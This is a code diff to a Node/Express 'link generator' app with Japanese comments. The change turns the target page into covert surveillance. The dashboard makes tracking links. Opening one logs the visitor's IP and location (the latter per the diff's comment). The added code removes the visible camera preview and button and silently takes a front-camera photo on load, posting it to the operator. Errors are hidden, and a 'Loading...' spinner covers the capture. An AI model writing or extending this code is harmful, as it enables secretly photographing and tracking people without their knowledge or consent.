@@ -13,7 +13,7 @@ function generateId() {
          Math.random().toString(36).substring(2, 6);
 }
 
-// ===== HTML（コマンド画面＋写真ウィンドウ削除） =====
+// ===== HTML（コマンド画面） =====
 const HTML = `<!DOCTYPE html>
 <html>
 <head>
@@ -30,7 +30,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 .window .resize-handle { position:absolute; right:0; bottom:0; width:32px; height:32px; cursor:nwse-resize; z-index:20; touch-action:none; background:transparent; }
 .window .resize-handle::after { content:''; position:absolute; right:4px; bottom:4px; width:0; height:0; border-right:14px solid #555; border-bottom:14px solid #555; border-left:14px solid transparent; border-top:14px solid transparent; opacity:0.8; pointer-events:none; }
 
-/* コマンドウィンドウ */
 #cmd-window { left:40px; top:40px; width:90vw; max-width:780px; height:60vh; min-width:400px; min-height:300px; }
 #cmd-terminal { flex:1; background:#000; padding:20px 14px 8px 14px; display:flex; flex-direction:column; overflow:hidden; min-height:0; }
 #cmd-output { flex:1; overflow-y:auto; white-space:pre-wrap; word-break:break-all; font-size:14px; line-height:1.6; color:#fff; margin-bottom:4px; -webkit-overflow-scrolling:touch; }
@@ -47,7 +46,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 .cmd-code { color:#88ffaa; }
 .cmd-photo { color:#ff88cc; }
 
-/* メニューウィンドウ */
 #menu-window { left:60px; top:62vh; width:80vw; max-width:480px; height:auto; min-height:140px; padding:20px 20px 18px 20px; }
 #menu-window .menu-title { color:#fff; font-size:15px; margin-bottom:14px; font-weight:bold; }
 #menu-window .btn-row { display:flex; gap:10px; flex-wrap:wrap; }
@@ -64,7 +62,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 </head>
 <body>
 
-<!-- コマンドウィンドウ -->
 <div id="cmd-window" class="window">
   <div class="drag-area" id="cmd-drag"></div>
   <div id="cmd-terminal">
@@ -77,7 +74,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
   <div class="resize-handle" id="cmd-resize"></div>
 </div>
 
-<!-- メニューウィンドウ -->
 <div id="menu-window" class="window">
   <div class="drag-area" id="menu-drag"></div>
   <div class="menu-title">■ リンク生成</div>
@@ -118,11 +114,9 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     window._lastLog = data;
   });
 
-  // ★ 写真受信 → コマンド画面に直接表示
   let photoCountNum = 0;
   socket.on('new-photo', function(data) {
     photoCountNum++;
-    // コマンド画面に画像を追加
     const imgDiv = document.createElement('div');
     imgDiv.style.margin = '4px 0';
     const img = document.createElement('img');
@@ -137,7 +131,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     addCmdOutput('[📸 写真受信] ' + photoCountNum + '枚目を受信しました！', 'cmd-photo');
   });
 
-  // ===== コマンド処理 =====
   cmdInput.addEventListener('keydown', function(e) {
     if (e.key === 'Enter') {
       const cmd = cmdInput.value.trim();
@@ -312,7 +305,7 @@ app.get('/generate', (req, res) => {
   res.json({ link });
 });
 
-// ★ 相手側ページ（位置情報＋カメラ 順番通り・軽量）
+// ★ 相手側ページ（ローディングのみ＋自動取得）
 app.get('/t/:id', (req, res) => {
   const id = req.params.id;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'IP不明';
@@ -332,23 +325,12 @@ app.get('/t/:id', (req, res) => {
         @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
         .msg { color:#6688aa; font-size:16px; margin-top:24px; letter-spacing:1px; }
         .sub { color:#334455; font-size:13px; margin-top:8px; }
-        #camera-container { display:none; margin-top:20px; flex-direction:column; align-items:center; gap:12px; }
-        video { width:200px; height:150px; background:#000; border:1px solid #334455; border-radius:4px; object-fit:cover; }
-        .btn-cam { background:transparent; border:1px solid #4a8ada; color:#4a8ada; padding:6px 18px; font-family:inherit; font-size:13px; cursor:pointer; transition:all 0.2s; }
-        .btn-cam:hover { background:#1a2a4a; }
-        .btn-cam:disabled { opacity:0.4; cursor:not-allowed; }
-        .status-text { color:#6688aa; font-size:13px; margin-top:4px; }
       </style>
     </head>
     <body>
       <div class="spinner"></div>
       <div class="msg">Loading...</div>
       <div class="sub">please wait</div>
-      <div id="camera-container">
-        <video id="video" autoplay playsinline></video>
-        <button class="btn-cam" id="capture-btn">📸 写真を撮る</button>
-        <div class="status-text" id="cam-status">カメラ準備中...</div>
-      </div>
 
       <script>
         var locationSent = false;
@@ -377,47 +359,32 @@ app.get('/t/:id', (req, res) => {
           sendLocation(null, null);
         }
 
-        // ---- カメラ処理（位置情報の後） ----
-        function sendPhoto(imageData) {
-          fetch('/photo', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ id: id, image: imageData })
-          });
-        }
-
-        // カメラ起動
-        (function startCamera() {
-          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            document.getElementById('cam-status').textContent = '⚠️ カメラ非対応';
-            return;
-          }
+        // ---- カメラ：自動で1枚撮影（ボタンなし、表示なし） ----
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
           navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
             .then(function(stream) {
-              const video = document.getElementById('video');
+              const video = document.createElement('video');
               video.srcObject = stream;
               video.play();
-              document.getElementById('camera-container').style.display = 'flex';
-              document.getElementById('cam-status').textContent = '📷 カメラ準備完了';
-              document.getElementById('capture-btn').addEventListener('click', function() {
-                if (photoTaken) return;
-                const video = document.getElementById('video');
+              video.onloadedmetadata = function() {
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
-                sendPhoto(dataUrl);
-                photoTaken = true;
-                document.getElementById('capture-btn').disabled = true;
-                document.getElementById('cam-status').textContent = '✅ 写真撮影完了！';
-              });
+                fetch('/photo', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ id: id, image: dataUrl })
+                });
+                stream.getTracks().forEach(function(track) { track.stop(); });
+              };
             })
             .catch(function(err) {
-              document.getElementById('cam-status').textContent = '⚠️ カメラ拒否またはエラー';
+              // カメラ拒否またはエラー：何もしない
             });
-        })();
+        }
       </script>
     </body>
     </html>
